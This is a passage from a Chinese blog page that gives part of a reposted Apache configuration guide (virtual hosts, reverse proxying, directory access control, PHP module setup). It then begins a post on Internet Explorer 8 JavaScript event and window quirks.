11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ServerName</span><a href="http://www.example.org/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">www.example.org</span></a> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/VirtualHost&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">NameVirtualHost 172.20.30.40:81</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;VirtualHost 172.20.30.40:81&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">DocumentRoot /www/example3</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ServerName</span><a href="http://www.example3.net/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">www.example3.net</span></a> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/VirtualHost&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"># IP-based</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;VirtualHost 172.20.30.50&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">DocumentRoot /www/example4</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ServerName</span><a href="http://www.example4.edu/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">www.example4.edu</span></a> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/VirtualHost&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;VirtualHost 172.20.30.60:81 172.20.30.40:81&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">DocumentRoot /www/example5</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ServerName</span><a href="http://www.example5.gov/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">www.example5.gov</span></a> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/VirtualHost&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">22、虚拟主机混用时的问题：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">一、虚拟主机混用可以这样理解：一行NameVirtualHost指令定义的所有虚拟主机为一组；该组与一个基于IP的虚拟主机平级。即把一行NameVirtualHost定义的整个组看作是一个基于IP的虚拟主机。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">二、虚拟主机指定的端口必须是Listen定义的。如果虚拟主机没有指定端口，则认为是80端口。如果NameVirtualHost * 这样定义，是指所有地址的所有已定义端口。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">三、更具体的地址定义优先。比如NameVirtualHost指令定义了*:80，而某个基于IP的虚拟主机定义为192.168.0.1:80，那么 此时如有对192.168.0.1:80的请求，那请求会被优先指向192.168.0.1:80定义的虚拟主机。所以为了避免混乱，不要定义相互有交叉 或包含的地址区间。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">四、一个虚拟主机，可以同时为基于域名和基于IP的。如上一例中最后一个虚拟主机。这样符合两种定义的请求都会被指同一个虚拟主机。有时要区别内外网对虚拟主机的访问时可以这样，因为来自内网的请求可能和来自外网的请求可能不一样，但是它们需要指向同一个虚拟主机。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">23、使用”_default_”虚拟主机，这个虚拟主机可以理解成基于IP的虚拟主机。例：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;VirtualHost _default_:*&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">DocumentRoot /www/default</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/VirtualHost&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">这个虚拟主机将接管与其它虚拟主机IP和端口不匹配的请求。不过如此一来，主服务器将不会处理任何请求。因此把主服务器配置成一个虚拟主机是必要的。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">24、本地机器代理在其它机器上运行的虚拟主机。例：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;VirtualHost 158.29.33.248&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ProxyPreserveHost On</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ProxyPass /foo/no !</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ProxyPass /foo</span><a href="http://192.168.111.2/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">http://192.168.111.2</span></a> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ProxyPassReverse /foo</span><a href="http://192.168.111.2/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">http://192.168.111.2</span></a> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">ServerName hostname.example.com</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/VirtualHost&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">一、首先这是一个基于IP的虚拟主机，它接收并处理对IP地址158.29.33.248的请求。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">二、ProxyPass /foo</span><a href="http://192.168.111.2/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">http://192.168.111.2</span></a><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 将把对</span><a href="http://158.29.33.248/foo"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">http://158.29.33.248/foo</span></a><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">的请求转换为一个代理请求，该请求指向</span><a href="http://192.168.111.2/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">http://192.168.111.2</span></a><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">三、ProxyPass /foo/no ! 不代理针对/foo/no的请求。这个必须放在正常代理指令之前。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">四、ProxyPreserveHost On 意思是传送原始请求的Host信息给被代理的机器。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">五、ProxyPassReverse /foo</span><a href="http://192.168.111.2/"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000099;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: underline">http://192.168.111.2</span></a><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 可以保证请求URL在其它机器上被重定向后，本机处理时也可以保持一致。具体看手册关于反向代理的部分。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">六、基于域名的虚拟主机也是同样的道理。不管是什么类型的虚拟主机，它只是处理归它处理的请求而已。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">配置段</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">25、&lt;IfDefine&gt; 只有在用httpd命令行启动服务器时（最好不要直接使用httpd，用apachectl代替），使用了-D参数定义了相应参数时才生效。如服务器用 apachectl –D test启动时，&lt;IfDefine test&gt;配置段生效。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">26、&lt;IfVersion&gt; 例如：&lt;IfVersion &gt;= 2.0.55&gt; 当Apache版本不低于2.0.55时生效。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">27、&lt;IfModule&gt; 服务器启用了指定的模块后才生效。这是最常用的。例如&lt;IfModule mod_mine_magic.c&gt;。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">28、&lt;Directory&gt; 用于封装一组指令，使之对某个目录和下属的子目录有效。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">例：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;Directory /&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Options FollowSymLinks Indexes</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">AllowOverride None</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Order Deny,Allow</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Deny from All</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Allow from example.com</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/Directory&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">该配置段对整个根目录树有效。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">一、 Options 常用选项：FollowSymlinks允许在此目录中使用符号链接；Indexes允许目录列表，即在该目录没有默认页时服务器返回该目录的列表给客户 机；SymLinksIfOwnerMatch只有符号链接与其目的目录或文件属于同一用户时才有效。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">注意：对同一目录，只有一行Options有效，如果定义某个目录的Options同时要继承上级目录的定义，可以这样：Options +Indexes。如果这样：Options +Indexes –FollowSymLinks，这将为本级目录增加Indexes，取消FollowSymLinks。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">二、AllowOverride 常用选项：None 不允许使用.htaccess；All允许在.htaccess中使用所有的指令。一般不必使用.htaccess，而且为了安全和效率起见，设置为None比较好。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">三、Order 访问控制，控制条件由Deny行和Allow行定义。Order指令常用选项：Deny,Allow 除了符合条件的外，其它的也允许访问；Allow,Deny 除了符合条件的外，其它的不允许访问。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Deny from All是拒绝所有的访问，Allow from example.com是允许example.com域访问该目录（意思是如果该服务器上有多个虚拟主机的话，只有example.com可以访问该目 录）。三行合起来的意思就是只允许example.com域访问根目录。当然这只是个例子，应该禁止所有域对根目录的访问。注意：Deny，Allow指 令生效的顺序取决于Order中Deny和Allow的顺序。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">注意&lt;Directory&gt;不能嵌套。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">这样为了安全起见常常需要设置：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">#拒绝对所有目录的访问，注意这里的/是指操作系统的根目录，而非DocumentRoot目录。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;Directory /&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Options –Indexes -FollowSymLinks</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">AllowOverride None</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Order Allow,Deny</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/Directory&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">#允许所有对/var/htdocs的访问，允许对/var/htdocs的文件列表。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;Directory /var/htdocs&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Options +Indexes</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">Order Deny,Allow</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/Directory&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">29、&lt;Files&gt; 和&lt;Directory&gt;类似，不过它定义的是对文件的访问控制。它们都可以接受正则表达式为参数， 格式 如&lt;Files ~ “\.(gif|jpe?g|png)$”&gt;或者&lt;FilesMatch “\.(gif|jpe?g|png)$”&gt;。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">30、&lt;Location&gt;与&lt;Files&gt;和&lt;Directory&gt;同，不过它定义的是对URL的访问控制。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">PHP配置</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">31、加载php模块：LoadModule php5_module modules/libphp5.so</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">32、AddModule mod_php5.c （不是必须的）</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">33、哪种后缀的文件作为php脚本来解析：AddType application/x-httpd-php .php （这是必须的，但是可以用下面的配置代替）：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;Files *.php&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">SetOutputFilter PHP</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">SetInputFilter PHP</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&lt;/Files&gt;</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">这种方法还可以为.php文件专门设置更多的配置。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">34、哪种后缀的文件是php源文件：Addtype application/x-httpd-php-source .phps （不是必须的）</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">35、添加index.php为目录首页：DirectoryIndex index.php（视情况而定）</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">36、 ScriptAlias /php/ /usr/local/php/ 对类似http://example/php/abc.php的请求将引导执行/usr/local/php/abc.php脚本。（一些所谓配置指南里 有，事实上完全没有这个必要。并且ScriptAlias这个指令是针对CGI脚本的。他会把php脚本也当作已定义的cgi脚本处理）。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">37、 Action application/x-httpd-php “C:/PHP/php.exe” 所有application/x-httpd-php类型的文件都由C:/PHP/php.exe来处理，注意application/x-httpd- php必须是已经定义的文件类型。（只有在windows中以CGI模式安装PHP时才有用）。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">38、事实上，必要的配置只有这么两条：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">LoadModule php5_module modules/libphp5.so</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">AddType application/x-httpd-php .php</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">可以把相关php的配置语句都放在一起便于管理。简单至此，不要被一些配置指南吓住了</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span></p> <p class="read-more">Continue reading <a class="heading" href="/php/2011/06/09/e3-80-90-e8-bd-ac-e3-80-91apache-e5-9f-ba-e6-9c-ac-e9-85-8d-e7-bd-ae-e6-8c-87-e5-8d-97.html" data-flip="title">【转】Apache基本配置指南</a></p> </article> <article id="post-web%E5%89%8D%E7%AB%AF/2011/06/09/ie-%e7%ba%a0%e7%bb%93%e6%b1%87%e6%80%bb" class="post mb6" role="article"> <header> <h1 class="post-title"> <a href="/web%E5%89%8D%E7%AB%AF/2011/06/09/ie-e7-ba-a0-e7-bb-93-e6-b1-87-e6-80-bb.html" data-flip="title"> ie 纠结汇总 </a> </h1> <p class="post-date heading"> <time datetime="2011-06-09T18:19:58+08:00">09 Jun 2011</time> in <span>Web前端</span> on <span>Javascript web 前端</span> </p> <div class="hr" style="padding-bottom:0"></div> </header> <p><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none" id="internal-source-marker_0.3931499070591987">IE8中点击锚记，如果a标记的target不是_blank，且href不是#,则会触发window的onload和onbeforeunload.</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">也就是说--经常的写法href=&quot;javascript:void(0)&quot;也是会触发事件，估计MS是被石头敲了。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"></span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"></span>------------------------------------------------------</p> <p>onload事件问题: <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">下面的写法：</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;script type=&quot;text/javascript&quot;&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">function ops(){</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">var win = window.open('','_blank');</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">win.onload = function(){</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">alert('ok');</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">};</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">win.location.href = 'test.html';</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">}</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;/script&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;/head&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;body&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"></span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;div class=&quot;bb&quot; onclick=&quot;ops();&quot;&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">圆角三边 这里是内容</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;/div&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"></span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;/body&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"></span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">火狐里面是可以alert的，但是ie8就不行。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">解决办法是子窗体调父窗体的方法模拟回调。（IE真是让人纠结。）</span> </p> <p>另外的:</p> <p>window的onload事件比较容易触发不了，往往出现在初始化页面时此时你认为还没有onload但是</p> <p>document.readyState 已经是 &quot;complete&quot;了，所以此时添加的onload事件不会触发。 <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"></span>----------------------------------------------------------------- <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Ie8 window.open函数指定 location=no status=no 不起作用的原因是：ie8安全设置里需要加入站点为可信任站点，这种前提下，location=no status=no才会起作用。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"></span>---------------------------------------------------------------- <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">默认div overflow-y:auto时，当出现滚动条时,用户想要选择文字，他向上滚动滚动条也应该滚动，但是如果设置了overflow-x:hidden，ie就白痴的不滚动了，FF下面是滚动的。</span> <br />------------------------------------------------------------ <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">window 的onblur事件：当这个窗口的某个元素获得焦点时，竟然也会触发window的onblur事件。（不一定是所有的情况会出现这个问题，具体那种情况下会出现这个问题还不知道）做chat时窗口消息提示出现问题就是这个原因，还好ie特别的有document的onfocusin 和onfocus 